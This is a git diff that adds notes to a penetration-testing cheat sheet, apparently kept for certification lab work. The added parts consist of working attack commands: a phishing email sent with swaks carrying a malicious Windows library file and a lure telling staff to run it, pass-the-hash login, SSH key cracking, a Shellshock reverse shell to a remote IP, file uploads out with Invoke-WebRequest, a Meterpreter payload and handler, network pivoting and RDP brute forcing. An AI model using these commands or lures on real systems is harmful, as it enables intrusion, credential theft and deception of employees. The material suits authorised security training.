@@ -578,6 +578,43 @@ smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -c
 
 # Check
 \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
+
+# Windows Library Code
+
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.$myIP</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+Sending an email with swaks example:
+
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+
+Requirement: SMTP (Usually port 25) usually works.
+
+Body.txt:
+
+Hey!
+
+On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+
+John
+
 ```
 ## Port 143/993 IMAP
 REF: Postfish
@@ -862,7 +899,19 @@ wpscan --url http://10.11.1.111 --enumerate vt
 wpscan --url http://10.11.1.111 --enumerate u
 wpscan -e --url https://url.com
 
+--- my notes ---
 
+Checking for vulnerable plugins: wpscan --url yourwebsite.com -e vp --api-token YOUR_TOKEN
+
+Checking for vulnerable themes: wpscan --url yourwebsite.com -e vt --api-token YOUR_TOKEN
+
+Checking for users: wpscan --url yourwebsite.com -e u
+
+Scanning without API Key, saving to folder: wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o outputfile
+
+Password cracking: wpscan –url http://example.com –passwords ~/Documents/crack/rockyou.txt –usernames admin
+
+----
 
 Check IP behing WAF:
 https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
@@ -947,12 +996,11 @@ dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ
 
 # GoBuster
-gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
-gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
-gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt
-# Gobuster: Finding html, pdf, txt, php or asp files
-gobuster dir -u http://192.168.223.83:8088 -w /usr/share/wordlists/dirb/big.txt -x ".html, .pdf, .txt, .php, .asp"
+gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e -t 50
+gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
+gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt -t 50
+gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt -t 50
+gobuster dir -u http://192.168.223.83:8088 -w /usr/share/wordlists/dirb/big.txt -x ".html, .pdf, .txt, .php, .asp" -t 50
 
 dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
 
@@ -2640,4 +2688,127 @@ cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt
 
 # Recursive search
 dir /s
+```
+### Miscellaneous
+
+```
+When you can't crack a NTLM hash, you can authenticate to a system with just the hash using this command:
+
+sudo impacket-psexec itwk04admin@192.168.236.226 -hashes :445414c16b5689513d4ad8234391aacf
+
+Obviously: Change the user, ip addresses and hash accordingly. Note that the colon before the hash is **required**
+
+Cracking id_rsa SSH: 
+
+First, convert the id_rsa into a ssh Hash: ssh2john id_rsa > ssh.hash
+
+Then, crack with john like this: john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+
+Connect up like so: ssh -i id_rsa daniela@192.168.50.244
+
+Priv Esculation: Linpeas.sh
+
+Steganography: Sometimes hidden data is secreted in a file. We can inspect them using steghide.
+
+steghide extract -sf trytofind.jpg
+
+Note 2: When scanning an ip with gobuster, if we get a status 403, we can rescan just that directory to see if any more sub-directories become accessable
+
+Note 3: We can use nikto to scan a web server to see if it is vulnerable to shellshock.
+
+Shell shock payload: 
+
+curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://192.168.1.104/cgi-bin/test/test.cgi
+
+For Reverse Shell: curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.175/4444 0>&1' http://192.168.151.87/cgi-bin/test/test.cgi
+
+Uploading file with iwr:
+Invoke-WebRequest -Uri "https://remote-server-address/path/on/remote/server/upload_endpoint" -Method PUT -InFile "C:\path\to\local\file"
+
+NOTE: Sometimes files with odd extensions, or that are too big: will fail to upload! In that case: compress the file (s) into zip first, then do it like this:
+
+Invoke-WebRequest -Uri "http://192.168.45.204:850/compressed.zip" -Method PUT -InFile ".\compressed.zip"
+
+SharpHound / BloodHound Notes: /usr/lib/bloodhound/resources/app/Collectors
+Downloading it on Windows Powershell: iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+
+Executing it: 
+
+powershell -ep bypass
+. .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+Upload bloodhound.zip to the Kali Machine.
+
+Then, start neo4j: 
+    neo4j start
+
+run bloodhound:
+    bloodhound
+
+Login to bloodhound: neo4j/2.2~Z8tB!EHS8t2
+
+Import bloodhound.zip
+
+Bloodhound Queries: 
+
+Getting all computers: MATCH (m:Computer) RETURN m
+Getting all users: MATCH (m:Computer) RETURN m
+Finding all active sessions: MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+
+Using Msfvenom to Make Meterpreter reverse shell:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
+
+Transfer files to target use iwr.
+
+meterpreter:
+
+    sudo msfconsole -q
+    use multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST $ip_address
+    set LPORT 443
+    set exitonsession false
+    run -j
+
+
+Once session is opened: We can use multi/manage/autoroute and auxilliary/server/socks_proxy 
+
+    use multi/manage/autoroute
+    set session 1
+    
+run
+
+# Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
+ 
+    use auxiliary/server/socks_proxy
+    set SRVHOST 127.0.0.1
+    set version 5
+    run -j
+
+Scanning smb with proxychains: proxychains -q crackmapexec smb 172.16.84.240-241 172.16.84.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
+
+Ping Sweep With Powershell on Windows:
+
+Import-Module Microsoft.PowerShell.Management
+
+$ips = 1..10 | % { "192.168.1.$_" } 
+
+$ips | ForEach-Object {
+   
+   $result = Test-Connection -Count 1 -ComputerName $_ -Quiet
+   "$($_) $result"
+}
+
+Brute Forcing RDP:
+
+hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
+
+
+
+
+
+
+
+
 ```
